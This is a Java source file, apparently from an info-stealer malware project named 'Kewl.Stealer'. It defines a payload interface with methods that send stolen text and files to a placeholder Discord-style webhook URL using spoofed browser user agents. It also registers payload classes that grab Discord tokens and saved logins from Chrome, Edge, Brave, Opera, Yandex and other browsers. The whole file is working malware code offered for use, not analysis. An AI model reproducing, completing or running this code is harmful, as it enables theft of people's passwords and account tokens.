package Kewl.Stealer.payload;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import Kewl.Stealer.payload.payloads.browsers.*;
import Kewl.Stealer.payload.payloads.discord.DiscordTokens;

public interface IPayload {
    void run();

    default void send(String string) {
        PrintWriter printWriter = null;
        BufferedReader bufferedReader = null;
        StringBuilder stringBuilder = new StringBuilder();

        try {
            URL uRL = new URL("webhook");
            URLConnection uRLConnection = uRL.openConnection();
            uRLConnection.setRequestProperty("accept", "*/*");
            uRLConnection.setRequestProperty("connection", "Keep-Alive");
            uRLConnection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            uRLConnection.setDoOutput(true);
            uRLConnection.setDoInput(true);
            printWriter = new PrintWriter(uRLConnection.getOutputStream());
            String string3 = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(string, "UTF-8");
            printWriter.print(string3);
            printWriter.flush();
            bufferedReader = new BufferedReader(new InputStreamReader(uRLConnection.getInputStream()));

            String string2;
            while((string2 = bufferedReader.readLine()) != null) {
                stringBuilder.append("/n").append(string2);
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        } finally {
            try {
                if (printWriter != null) {
                    printWriter.close();
                }

                if (bufferedReader != null) {
                    bufferedReader.close();
                }
            } catch (IOException iOException) {
                iOException.printStackTrace();
            }

        }

    }

    default void send(File file) {
        try {
            String boundary = Long.toHexString(System.currentTimeMillis());
            URLConnection connection = (new URL("webhook")).openConnection();
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII));

            try {
                writer.println("--" + boundary);
                writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
                writer.write("Content-Type: image/png");
                writer.println();
                writer.println(this.readAllBytes(new FileInputStream(file)));
                BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII));

                String line;
                try {
                    while((line = reader.readLine()) != null) {
                        writer.println(line);
                    }
                } catch (Throwable var10) {
                    try {
                        reader.close();
                    } catch (Throwable var9) {
                        var10.addSuppressed(var9);
                    }

                    throw var10;
                }

                reader.close();
                writer.println("--" + boundary + "--");
            } catch (Throwable var11) {
                try {
                    writer.close();
                } catch (Throwable var8) {
                    var11.addSuppressed(var8);
                }

                throw var11;
            }

            writer.close();
            System.out.println(((HttpURLConnection)connection).getResponseCode());
        } catch (Exception var12) {
        }

    }

    default byte[] readAllBytes(InputStream stream) throws IOException {
        int pos = 0;
        byte[] output = new byte[0];
        byte[] buf = new byte[1024];

        int count;
        while((count = stream.read(buf)) > 0) {
            if (pos + count >= output.length) {
                byte[] tmp = output;
                output = new byte[pos + count];
                System.arraycopy(tmp, 0, output, 0, tmp.length);
            }

            for(int i = 0; i < count; ++i) {
                output[pos++] = buf[i];
            }
        }

        return output;
    }

    static IPayload[] getPayloads() {
        return new IPayload[]{new DiscordTokens(), new _360BrowserLogins(), new BraveLogins(), new ChromeBetaLogins(), new ChromeCanaryLogins(), new ChromeLogins(), new CocCocLogins(), new EdgeLogins(), new EpicBrowserLogins(), new OperaGxLogins(), new OperaNeonLogins(), new OperaLogins(), new VivaldiLogins(), new YandexLogins()};
    }
}
